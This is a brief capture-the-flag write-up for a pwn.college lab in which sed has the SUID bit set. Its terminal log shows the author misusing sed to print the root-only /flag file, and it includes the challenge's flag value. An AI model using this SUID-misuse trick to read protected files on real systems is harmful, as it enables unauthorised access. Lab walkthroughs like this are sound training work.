`sed` is a stream editor. A stream editor is used to perform basic text transformation on an input stream(a `file` or a input from a pipeline).

https://www.gnu.org/software/sed/manual/sed.html

If you just go through the article a little bit, you will find this:

> [!NOTE]
> `Use -n to suppress output, and the 'p' command to print specific lines. The following command prints only line 45 of the input file:`
> 
> ```bash
> sed -n '45p' file.txt
> ```

```bash
hacker@program-misuse-level-35:~$ cd /
hacker@program-misuse-level-35:/$ cd challenge/
hacker@program-misuse-level-35:/challenge$ ls
babysuid_level35
hacker@program-misuse-level-35:/challenge$ ./babysuid_level35 
Welcome to ./babysuid_level35!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/sed.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/sed!
hacker@program-misuse-level-35:/challenge$ sed /flag
sed: -e expression #1, char 5: unterminated address regex
hacker@program-misuse-level-35:/challenge$ sed cd /
sed: read error on /: Is a directory
hacker@program-misuse-level-35:/challenge$ cd /
hacker@program-misuse-level-35:/$ sed flag
sed: -e expression #1, char 1: unknown command: `f'
hacker@program-misuse-level-35:/$ sed -n flag
sed: -e expression #1, char 1: unknown command: `f'
hacker@program-misuse-level-35:/$ sed -n '1p' flag
pwn.college{0Fpz88c8uNB050m8T__5U5d5QDx.01N3EDL0AjNzQzW}
```


